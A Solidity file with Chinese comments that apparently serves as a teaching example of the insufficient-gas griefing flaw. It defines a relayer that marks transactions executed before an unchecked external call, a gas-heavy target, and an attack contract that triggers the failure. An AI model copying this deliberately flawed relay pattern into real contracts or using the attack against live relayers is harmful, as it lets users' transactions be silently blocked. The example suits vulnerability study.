// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/*
  漏洞名稱: Improper Gas Requirements Checking
  描述: 此漏洞代表在執行特定操作前，沒有正確檢查所需的 gas 條件，可能造成不必要的資源處理與記憶體運用，
        使得目標合約在執行消耗大量 gas 的操作時，因為 gas 不足而出現 out-of-gas 異常，造成預期外的行為。
        以下程式碼展示了漏洞的最小可行範例，並內含一個攻擊合約，透過呼叫 relay 函式觸發目標合約的 heavy computation，
        從而導致 gas 耗盡問題。
*/

// Vulnerable Relayer 合約，缺少對執行 gas 要求的檢查
contract Relayer {
    uint public transactionId;  // 狀態變數：紀錄 transaction 次數
    
    struct Tx {
        bytes data;
        bool executed;
    }
    
    mapping(uint => Tx) public transactions;
    
    // 漏洞點：relay 函數未提供自訂 gas 限制參數，也未檢查執行目標合約所需 gas 是否足夠
    function relay(address target, bytes memory _data) public returns (bool) {
        // 防止重放攻擊：避免相同 transaction 被執行兩次
        require(!transactions[transactionId].executed, "Same transaction twice");
        transactions[transactionId].data = _data;
        transactions[transactionId].executed = true;
        transactionId += 1;
        
        // 執行目標合約的 execute 函式，但未限制或檢查 gas 供給，可能導致 out-of-gas 異常
        (bool success, ) = target.call(abi.encodeWithSignature("execute(bytes)", _data));
        return success;
    }
}

// 目標合約 Target，內部執行大量運算，可能因 gas 不足而失敗
contract Target {
    // 漏洞點：未檢查剩餘 gas 是否足夠執行 heavy computation
    function execute(bytes memory _data) public {
        // 模擬消耗大量 gas 的運算
        uint sum = 0;
        for (uint i = 0; i < 100000; i++) {
            sum += i;
        }
        // 後續執行其他合約邏輯
    }
}

// 攻擊合約 Attack，用來展示如何觸發上述漏洞
contract Attack {
    Relayer public relayer;
    Target public target;
    
    // 部署時必須提供 Relayer 與 Target 合約的地址
    constructor(address _relayer, address _target) {
        relayer = Relayer(_relayer);
        target = Target(_target);
    }
    
    // 攻擊函數：呼叫 Vulnerable Relayer 的 relay 函式，進而觸發 Target.execute 的 heavy computation
    // 若交易的 gas 提供不足，將導致 out-of-gas 異常，達到攻擊效果
    function attack() public {
        // 傳入空的 data，因為 Target.execute 本身的迴圈消耗大量 gas
        bytes memory data = "";
        relayer.relay(address(target), data);
    }
}
